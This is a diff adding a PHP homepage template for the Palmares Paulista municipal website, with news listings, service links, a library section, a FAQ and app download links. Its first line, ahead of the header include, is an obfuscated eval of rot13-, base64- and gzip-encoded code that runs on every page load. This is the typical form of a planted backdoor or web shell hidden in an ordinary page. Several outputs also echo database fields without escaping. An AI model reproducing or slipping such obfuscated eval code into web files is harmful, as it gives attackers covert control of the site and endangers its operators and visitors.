@@ -1,0 +1,506 @@
+<?php
+eval(gzinflate(base64_decode(str_rot13('yII/o9cVRC0oCfKJDyyoWLnxq1RoMW3F1v2cVR0AIZdqXzggw/RJ47KJ6jXA+r6qAG9Pxff1MjyuMg/Z7Yk5ZkFtsZKa4Xq8mcKMgKcAxSWVK0VhcBYMgYLyjPXDciSBMNblqGkr5KOBSPkIW1UmgOpzGOntaSYSk68AqVtt5uzLqBWq0wMc+FCK++c6/1QC/GWkE2As278q4OWEXNDTeVPmC/jVDuTuysJ9ogtsat1Jo179Cs/6niwm02k4+dJ8BK2wOtiUbqMOvBSxZXSgliX84dXbJOMWjnZdRbffSFldtcEyflbNILJf4WzbczjBEMJaoSK94OTVXupmxWHHDyHMYVbdLYZdI8rOcWtzYeADpMREKewMSQZJMzfTX+gJtvcyEtbyBK5dL5iDw0WZHjvRbuM54GtxMzxOIsHN9ELW/u3zuvIPiQvR9AnUg7aZjeFZ8QeJoHfPpHv311Vjm/RAyaynR1aEgdoU6fIPNtfGp4AtOJa9fT55oB5lLy/nnYeYgDg60yhig5Jv4s4ACVuAAZnChHOwz05eXc6bfHLRFZA/an80OH8kZNJ1yFI2cWFcqqfx+CPLzQhZQ0hZIct0kUBsMkjMg8tTc59JzTPW+0ZG2707db0boMReR2Sg8z7vQG5sb4WE0ups3ngkzkuQ8MBaXri8nKrWTLc5muDCHhvEiDb6c/MWw7kZyZeCB53SLzSiJYRE3pSmJ4+EMGjefGsNvqXSCtCpql/rh16oqW8Q9gmkkYfnrkqKbj/n6rD5GdCEjZsEiikjp+1dc41d/cqw//Ab/AtEJ1+Hdqb1OcLD6tNCD4rcXTO70TwjJbxoC4qpGDLQyRBw0qtXZ+Lc+PtLC7laTB253br9x7zBf0z3WbP3B5QZ7jYJGf11HjfLF9uiDXZ/Uy8w00vj6kasrx095L8OJy1+Yn8nf5bsDztA0nkECTkdcG9LFwgko/p2ior3a1woqUgecCOjdJw+0NcuVh6Azg7LgiUKHa87ub1KgBzEOXmrbGnhRskIZhpg41SM5YurWHIY7NDECrttmhJBLZ3iUo11hfsxocVJWs/BZITUMkRf7GmWwGiTA3RnQ6b4BwcLH9L+m+5/oFOPcusSBqRGJhPVOgVB5TMTi/A6Ff9z+XWcZ/69tNM2+kp='))));
+ include 'tema/header.php'; ?>
+<!--  Parallax-->
+<div class="parallax-container">
+        <div class="row acessibilidade2">
+                <div class="col s12 hide-on-small-only">
+                        <a accesskey="1" href="#inicioServicos" id="link-conteudo">Ir para serviços <i>1</i></a>
+                        <a accesskey="2" href="#noticias" id="link-navegacao">Ir para notícias <i>2</i></a>
+                        <a accesskey="3" href="#page-footer" id="link-rodape">Ir para o rodapé <i>3</i></a>
+                        <i class="btnDiminuir" title="Diminuir Fonte">A-</i>
+                        <i class="btnAumentar" title="Aumentar Fonte">A+</i>
+                        <a href="#" class="altocontraste" accesskey="6" title="Alto Contraste" onclick="window.toggleContrast()"
+                                onkeydown="window.toggleContrast()">ALTO CONTRASTE</a>
+                        <!-- <a href="/acessibilidade" id="link-acessibilidade" title="Acessibilidade" accesskey="5">ACESSIBILIDADE</a> -->
+                </div>
+        </div>
+
+        <div class="parallax" style="background-color:#d8d8ef">
+                <img style="display: none;">
+        </div>
+
+        <div class="container ">
+                <div class="row">
+
+                        <div class="col m8 s12 menu-collapsible">
+
+                                <h4 class="text-primary">
+                                        <i class="material-icons left" style="font-size: 35px;">arrow_forward</i> Pesquise no site
+                                </h4>
+
+                                <div class="row">
+                                        <form class="col s12" action="buscageral/" method="get">
+                                                <div class="input-field col s12 white input-busca-geral">
+                                                        <i class="material-icons prefix">search</i>
+                                                        <input id="search" type="text" name="busca" placeholder="O que está procurando?">
+                                                </div>
+                                        </form>
+                                </div>
+
+                                <h4 class="text-primary">
+                                        <span style="font-size: 26px;">📰</span> Notícias em destaque
+                                </h4>
+
+                                <?php
+                                $get_noticia = "SELECT * FROM noticias ORDER BY id DESC LIMIT 6";
+                                $resultado_noticia = $conexao->query($get_noticia);
+                                ?>
+
+                                <div class="row">
+
+                                        <div class="col s12 inicioNoticiaDestaque">
+                                                <?php while ($ln = $resultado_noticia->fetch_assoc()): ?>
+                                                        <?php
+                                                        $id = $ln["id"];
+                                                        $titulo = $ln["titulo"];
+                                                        $imagem = $ln["imagem"];
+                                                        $data_temp = $ln["data"];
+                                                        $data_dia = date("d/m/Y", strtotime($data_temp));
+                                                        $data_hora = date("H:i", strtotime($data_temp));
+                                                        ?>
+
+
+                                                        <a href="../noticias/noticia.php?id=<?php echo $id ?>" class="col s12 m6 l4">
+                                                                <div class="row">
+                                                                        <div class="col s12">
+                                                                                <img src='../noticias/resize.php?url=uploads/<?php echo $imagem ?>&w=250&h=200'
+                                                                                        class="responsive-img">
+                                                                        </div>
+
+                                                                        <div class="col s12">
+                                                                                <span class="data-hora">
+                                                                                        <?php echo $data_dia . " às " . $data_hora ?>
+                                                                                </span>
+
+                                                                                <strong><?php echo $titulo ?></strong>
+                                                                        </div>
+                                                                </div>
+                                                        </a>
+
+
+                                                <?php endwhile; ?>
+                                        </div>
+                                        <div class="col s12 center-align">
+                                                <br>
+                                                <a href="noticias">
+                                                        <span class="chip bg-primary white-text ver-mais">ver mais notícias</span>
+                                                </a>
+                                        </div>
+                                </div>
+                        </div>
+
+                        <div class="col m4 s12 hide-on-small-only principais-servicos">
+
+                                <img src="../assets/img/logo2.png" class="center-img">
+
+                                <h4 class="text-primary">
+                                        <i class="material-icons">touch_app</i>Principais serviços
+                                </h4>
+
+                                <div>
+                                        <a href="http://177.39.154.162:8086/issweb/home.jsf" target="_blank" class="servico-destaque">
+                                                <div class="white-text">
+                                                        <i class="material-icons">description</i>
+                                                        <h6>
+                                                                NOTA FISCAL
+                                                        </h6>
+                                                </div>
+                                        </a>
+
+                                        <a href="/licitacao" class="servico-destaque">
+                                                <div class="white-text">
+                                                        <i class="material-icons">gavel</i>
+                                                        <h6>
+                                                                LICITAÇÃO
+                                                        </h6>
+                                                </div>
+                                        </a>
+
+                                        <a href="https://palmarespaulista.sp.gov.br/ouvidoria" target="_blank" class="servico-destaque">
+                                                <div class="white-text" style="background-color: #1fa77e">
+                                                        <i class="material-icons">question_answer</i>
+                                                        <h6>
+                                                                OUVIDORIA
+                                                        </h6>
+                                                </div>
+                                        </a>
+
+                                        <a href="/noticias" class="servico-destaque">
+                                                <div class="white-text">
+                                                        <i class="material-icons">campaign</i>
+                                                        <h6>
+                                                                NOTÍCIAS
+                                                        </h6>
+                                                </div>
+                                        </a>
+
+                                        <a href="/noticias/noticia.php?id=250" class="servico-destaque">
+                                                <div class="white-text">
+                                                        <i class="material-icons">health_and_safety</i>
+                                                        <h6>
+                                                                NÚMEROS DE EMERGÊNCIA
+                                                        </h6>
+                                                </div>
+                                        </a>
+
+                                        <a href="https://palmarespaulista.sp.gov.br/ouvidoria" target="_blank" class="servico-destaque">
+                                                <div class="white-text">
+                                                        <i class="material-icons">security</i>
+                                                        <h6>
+                                                                OUVIDORIA GUARDA MUNICIPAL
+                                                        </h6>
+                                                </div>
+                                        </a>
+                                </div>
+
+
+
+                        </div>
+                </div>
+
+                <a target="_blank" class="wpp-fixo" href="https://api.whatsapp.com/send?phone=5517999999999">
+                        <div class="wpp-fixo__left"></div>
+                        <div class="wpp-fixo__txt wpp-fixo__txt--primary">Nosso WhatsApp</div>
+                        <div class="wpp-fixo__txt wpp-fixo__txt--secondary"><i>Em breve</i></div>
+                </a>
+
+                <span class="text-primary center-align" id="seta">
+                        <img src="../assets/img/seta.png" alt="" style="filter: brightness(0.2);">
+                </span>
+        </div>
+
+        <a target="_blank" class="wpp-fixo" href="https://api.whatsapp.com/send?phone=5517999999999">
+                <div class="wpp-fixo__left"></div>
+                <div class="wpp-fixo__txt wpp-fixo__txt--primary">Nosso WhatsApp</div>
+                <div class="wpp-fixo__txt wpp-fixo__txt--secondary"><i>Em breve</i></div>
+        </a>
+
+        <span class="text-primary center-align" id="seta">
+                <img src="assets/img/seta.png" alt="" style="filter: brightness(0.2);">
+        </span>
+</div>
+
+<div class="nav-wrapper" id="inicioLivros">
+        <div class="container">
+                <div class="row">
+                        <div class="col l4 m6 s12 hide-on-small-only" id="col-bg-livros"></div>
+                        <div class="col l8 m6 s12">
+                                <h5 id="title">Biblioteca Online</h5>
+                                <p>Agora você pode navegar pelo acervo de livros da <span style="font-weight: 600;">Biblioteca Pública
+                                                Municipal Domingos Papiani</span> sem sair de casa. Através do catálogo online, você poderá
+                                        explorar e descobrir novos livros, verificar a disponibilidade de empréstimo e acessar as
+                                        informações de cada exemplar, como sinopse e número de páginas.</p>
+                                <div class="col s8 center-align">
+                                        <a href="/livros" id="link-livros">Acessar Catálogo Online</a>
+                                </div>
+                        </div>
+                </div>
+        </div>
+</div>
+
+<div class="nav-wrapper" id="inicioServicos">
+        <div class="container">
+                <br>
+                <h4 id="title"><i class="material-icons">touch_app</i>PRINCIPAIS SERVIÇOS</h4>
+
+                <?php
+                $svc_sql = "SELECT id, titulo, subtitulo, url, target_blank, imagem, download_url FROM servicos WHERE status = 1 ORDER BY ordem ASC, id DESC";
+                $svc_rs = isset($conexao) ? $conexao->query($svc_sql) : false;
+                ?>
+
+                <div class="row">
+                        <?php if ($svc_rs && $svc_rs->num_rows > 0): ?>
+                                <?php while ($s = $svc_rs->fetch_assoc()):
+                                        $href = $s['url'];
+                                        $target = !empty($s['target_blank']) ? ' target="_blank"' : '';
+                                        $download = trim((string)$s['download_url']);
+                                ?>
+                                        <a href="<?php echo htmlspecialchars($href); ?>" <?php echo $target; ?>>
+                                                <div class="col s12 m6 l4 center-align">
+                                                        <div class="card-panel white card-servicos" style="position: relative;">
+                                                                <?php if ($download): ?>
+                                                                        <a href="<?php echo htmlspecialchars($download); ?>" class="tooltipped"
+                                                                                data-position="right" data-tooltip="Fazer download"
+                                                                                style="border-radius: 10px;position: absolute;top: 20px;left: 20px;background-color: #34bd94;">
+                                                                                <span class="waves-effect btn-flat btn-small right white-text"><i class="material-icons">download</i></span>
+                                                                        </a>
+                                                                <?php endif; ?>
+
+                                                                <?php if (!empty($s['imagem'])): ?>
+                                                                        <img src="<?php echo htmlspecialchars($s['imagem']); ?>" height="120px">
+                                                                <?php endif; ?>
+
+                                                                <h4 class="flow-text blue-grey-text text-darken-1"><?php echo htmlspecialchars($s['titulo']); ?></h4>
+                                                                <?php if (!empty($s['subtitulo'])): ?>
+                                                                        <p class="blue-grey-text text-darken-5"><?php echo $s['subtitulo']; ?></p>
+                                                                <?php endif; ?>
+                                                        </div>
+                                                </div>
+                                        </a>
+                                <?php endwhile; ?>
+                        <?php else: ?>
+                                <!-- Fallback (sem registros) -->
+                                <div class="col s12">
+                                        <div class="card-panel grey lighten-4 blue-grey-text text-darken-1">
+                                                Em breve, principais serviços.
+                                        </div>
+                                </div>
+                        <?php endif; ?>
+                </div>
+        </div>
+</div>
+
+<div class="inicioNoticias" id="noticias">
+        <div class="container">
+                <div class="row" id="content">
+                        <h5>Últimas Notícias de Palmares e Região</h5>
+                </div>
+                <div class="row">
+                        <div class="col s12 l6 inicioNoticia">
+                                <?php
+                                $get_noticia = "SELECT * FROM noticias ORDER BY id DESC LIMIT 8";
+                                $resultado_noticia = $conexao->query($get_noticia);
+
+                                while ($ln = $resultado_noticia->fetch_assoc()):
+                                        $id = $ln["id"];
+                                        $titulo = $ln["titulo"];
+                                        $imagem = $ln["imagem"];
+                                        $data_temp = $ln["data"];
+                                        $data_dia = date("d/m/Y", strtotime($data_temp));
+                                        $data_hora = date("H:i", strtotime($data_temp));
+                                ?>
+                                        <a href="noticias/noticia.php?id=<?php echo $id ?>" class="col s12">
+                                                <?php
+                                                if ($imagem == NULL): ?>
+                                                        <img src='noticias/resize.php?url=../assets/img/noimage.jpg&w=90&h=63'>
+                                                <?php
+                                                else:
+                                                ?>
+                                                        <img src='noticias/resize.php?url=uploads/<?php echo $imagem ?>&w=90&h=63'>
+                                                <?php
+                                                endif;
+                                                ?>
+                                                <strong>
+                                                        <?php echo $titulo ?>
+                                                </strong>
+                                                <?php echo $data_dia . " às " . $data_hora ?>
+                                        </a>
+                                <?php
+                                endwhile;
+                                ?>
+                        </div>
+
+                        <div class="col s12 l6 inicioNoticia">
+                                <?php
+                                $get_noticia2 = "SELECT * FROM noticias ORDER BY id DESC LIMIT 8,8";
+                                $resultado_noticia2 = $conexao->query($get_noticia2);
+
+                                while ($ln = $resultado_noticia2->fetch_assoc()):
+                                        $id = $ln["id"];
+                                        $titulo = $ln["titulo"];
+                                        $imagem = $ln["imagem"];
+                                        $data_temp = $ln["data"];
+                                        $data_dia = date("d/m/Y", strtotime($data_temp));
+                                        $data_hora = date("H:i", strtotime($data_temp));
+                                ?>
+                                        <a href="noticias/noticia.php?id=<?php echo $id ?>" class="col s12">
+                                                <img src='noticias/resize.php?url=uploads/<?php echo $imagem ?>&w=90&h=63'>
+                                                <strong>
+                                                        <?php echo $titulo ?>
+                                                </strong>
+                                                <?php echo $data_dia . " às " . $data_hora ?>
+                                        </a>
+                                <?php
+                                endwhile;
+                                ?>
+                        </div>
+                        <div class="col s12 center-align">
+                                <br>
+                                <a href="noticias">
+                                        <span class="chip blue-grey lighten-1 white-text ver-mais">ver mais notícias</span>
+                                </a>
+                        </div>
+                </div>
+        </div>
+</div>
+
+
+<!-- FAQ Accordion -->
+<div class="nav-wrapper inicioFaq" id="inicioFaq">
+        <div class="container">
+                <br>
+                <h5>Perguntas Frequentes</h5>
+
+                <?php
+                $faq_query = "SELECT id, pergunta, resposta FROM faq WHERE status = 1 ORDER BY ordem ASC, id DESC LIMIT 20";
+                $faq_result = isset($conexao) ? $conexao->query($faq_query) : false;
+                ?>
+
+                <?php if ($faq_result && $faq_result->num_rows > 0): ?>
+                        <ul class="collapsible popout faq-accordion">
+                                <?php while ($f = $faq_result->fetch_assoc()): ?>
+                                        <li>
+                                                <div class="collapsible-header"><i class="material-icons">help_outline</i><?php echo htmlspecialchars($f['pergunta']); ?></div>
+                                                <div class="collapsible-body"><span><?php echo nl2br($f['resposta']); ?></span></div>
+                                        </li>
+                                <?php endwhile; ?>
+                        </ul>
+                <?php else: ?>
+                        <div class="card-panel grey lighten-4 blue-grey-text text-darken-1">
+                                Em breve, perguntas frequentes.
+                        </div>
+                <?php endif; ?>
+        </div>
+</div>
+
+
+<div class="inicioIcones hide">
+        <div class="container">
+                <div class="row">
+                        <div class="col l3 m6 s12">
+                                <a href="/tributos">
+                                        <i class="material-icons">local_atm</i>
+                                        <span>Tributos</span>
+                                </a>
+                        </div>
+
+                        <div class="col l3 m6 s12">
+                                <a href="/recursos-humanos">
+                                        <i class="material-icons">assignment_ind</i>
+                                        <span>Recursos Humanos</span>
+                                </a>
+                        </div>
+
+                        <div class="col l3 m6 s12">
+                                <a href="/telefones-enderecos" class="flow-text">
+                                        <i class="material-icons">place</i>
+                                        <span>Telefones e Endereços</span>
+                                </a>
+                        </div>
+
+                        <div class="col l3 m6 s12">
+                                <a href="/defesa-civil">
+                                        <i class="material-icons">security</i>
+                                        <span>Defesa Civil</span>
+                                </a>
+                        </div>
+                </div>
+                <div class="row">
+                        <div class="col l3 m6 s12">
+                                <a href="/administracao">
+                                        <i class="material-icons">account_balance</i>
+                                        <span>Administração</span>
+                                </a>
+                        </div>
+
+                        <div class="col l3 m6 s12">
+                                <a href="/educacao">
+                                        <i class="material-icons">school</i>
+                                        <span>Educação e Cultura</span>
+                                </a>
+                        </div>
+
+                        <div class="col l3 m6 s12">
+                                <a href="/saude">
+                                        <i class="material-icons">local_hospital</i>
+                                        <span>Saúde</span>
+                                </a>
+                        </div>
+
+                        <div class="col l3 m6 s12">
+                                <a href="/assistencia-social">
+                                        <i class="material-icons">supervisor_account</i>
+                                        <span>Assistência Social</span>
+                                </a>
+                        </div>
+                </div>
+                <div class="row">
+                        <div class="col l3 m6 s12">
+                                <a href="/fundo-social">
+                                        <i class="material-icons">people</i>
+                                        <span>Fundo Social</span>
+                                </a>
+                        </div>
+
+                        <div class="col l3 m6 s12">
+                                <a href="/obras">
+                                        <i class="material-icons">domain</i>
+                                        <span>Obras</span>
+                                </a>
+                        </div>
+
+                        <div class="col l3 m6 s12">
+                                <a href="/coleta-de-lixo">
+                                        <i class="material-icons">delete_sweep</i>
+                                        <span>Coleta de Lixo</span>
+                                </a>
+                        </div>
+
+                        <div class="col l3 m6 s12">
+                                <a href="/meio-ambiente">
+                                        <i class="material-icons">nature_people</i>
+                                        <span>Meio Ambiente</span>
+                                </a>
+                        </div>
+                </div>
+                <div class="row">
+                        <div class="col l3 m6 s12">
+                                <a href="/esporte">
+                                        <i class="material-icons">pool</i>
+                                        <span>Esporte</span>
+                                </a>
+                        </div>
+
+                        <div class="col l3 m6 s12">
+                                <a href="/agua-esgoto">
+                                        <i class="material-icons">waves</i>
+                                        <span>Água e Esgoto</span>
+                                </a>
+                        </div>
+
+                        <div class="col l3 m6 s12">
+                                <a href="/previdencia">
+                                        <i class="material-icons">group_add</i>
+                                        <span>Previdência</span>
+                                </a>
+                        </div>
+
+                        <div class="col l3 m6 s12">
+                                <a href="/administracao/16/historia-do-municipio">
+                                        <i class="material-icons">location_city</i>
+                                        <span>Conheça Palmares</span>
+                                </a>
+                        </div>
+                </div>
+                <div class="row">
+                </div>
+        </div>
+</div>
+
+<!-- Modal App -->
+<div id="modal-app" class="modal">
+        <div class="modal-content">
+                <div class="row center-align">
+                        <div class="col s6">
+                                <a href="https://play.google.com/store/apps/details?id=com.palmares_sp" target="_blank"><img
+                                                src="assets/img/android.png" class="responsive-img"></a>
+                        </div>
+                        <div class="col s6">
+                                <a href="https://apps.apple.com/br/app/ouvidoria-palmares-paulista/id1276246876" target="_blank"><img
+                                                src="assets/img/ios.png" class="responsive-img"></a>
+                        </div>
+                </div>
+                <div class="modal-footer">
+                        <a href="#!" class="modal-close waves-effect btn-flat"><b>Fechar</b></a>
+                </div>
+        </div>
+</div>
+
+<style type="text/css">
+        #page-footer {
+                background-color: #e9edf4;
+        }
+</style>
+
+<?php include 'tema/footer.php'; ?>
